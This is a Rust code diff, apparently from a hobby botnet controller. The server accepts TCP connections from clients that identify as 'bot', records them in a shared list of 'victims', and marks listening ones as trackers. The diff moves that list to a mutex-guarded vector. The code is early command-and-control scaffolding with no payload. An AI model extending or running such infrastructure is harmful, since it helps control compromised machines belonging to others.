@@ -1,6 +1,6 @@
 mod tracker;
 
-use std::{net::{TcpListener, TcpStream, SocketAddr}, io::{BufReader, BufRead, Write}, thread, sync::mpsc};
+use std::{net::{TcpListener, TcpStream, SocketAddr}, io::{BufReader, BufRead, Write}, thread, sync::{mpsc, Mutex, Arc}};
 
 use crate::tracker::is_victim_listening;
 
@@ -18,47 +18,52 @@ pub struct Victim {
 
 fn main() {
     let listener = TcpListener::bind("192.168.0.12:9570").unwrap();
-    let mut victims: Vec<Victim> = Vec::new();
-    let (tx, rx) = mpsc::channel();
+    let victims: Arc<Mutex<Vec<Victim>>> = Arc::new(Mutex::new(Vec::new()));
 
     for stream in listener.incoming() {
         let stream = stream.unwrap();
 
-        for victim in rx.try_iter() {
-            println!("oui");
-            victims.push(victim);
-        }
         println!("Connection established");
-        let tx1 = tx.clone();
-        thread::spawn(move || {
-            let victim = handle_connection(stream);
-            tx1.send(victim).unwrap();
+        thread::spawn({
+            let victims = Arc::clone(&victims);
+            move || {
+                let victim = handle_connection(stream);
+                if let Some(victim) = victim {
+                    let mut victims = victims.lock().unwrap();
+                    victims.push(victim);
+                    println!("{:?}", victims);
+                }
+            }
         });
-        println!("{:?}", victims);
     }
 }
 
-fn handle_connection(mut stream: TcpStream) -> Victim {
-    let buf_reader = BufReader::new(&stream);
-    let http_request: Vec<_> = buf_reader
-        .lines()
-        .map(|result| result.unwrap())
-        .take_while(|line| !line.is_empty())
-        .collect();
+fn handle_connection(mut stream: TcpStream) -> Option<Victim> {
+    let mut buf_reader = BufReader::new(&stream);
+    let mut http_request: Vec<u8> = Vec::new();
+    buf_reader
+        .read_until(0, &mut http_request).unwrap();
 
-    println!("Request: {:?}", http_request);
-    let response = match http_request[0].as_str() {
-        // "bot" => ips.to_string(), // should return the best tracker in the ips vector
-        "serv" => "listen".to_string(),
-        _ => "coucou loser haha\n".to_string()
+    let http_request = std::str::from_utf8(&http_request).unwrap().replace('\0', "");
+    println!("Request: {:?} {:?}", http_request.as_bytes(), "bot".as_bytes());
+    let response = match http_request.as_str() {
+        "bot" => "active".to_string(),
+        _ => {
+            println!("oui");
+            return None;
+        }
     };
     let current_ip = stream.peer_addr().unwrap();
-    let victim = Victim { ip: current_ip, victim_type: VictimType::Tracker };
+    println!("ip: {}", current_ip);
+    let mut victim = Victim { ip: current_ip, victim_type: VictimType::Bot };
 
-    if response == "listen" && is_victim_listening(&victim) {
-
+    if is_victim_listening(&stream, &victim) {
+        println!("listen!!");
+        victim.victim_type = VictimType::Tracker;
     }
 
-    stream.write_all(response.as_bytes()).unwrap();
-    return victim;
+    if let Err(_) = stream.write_all(response.as_bytes()) {
+        return None;
+    }
+    return Some(victim);
 }
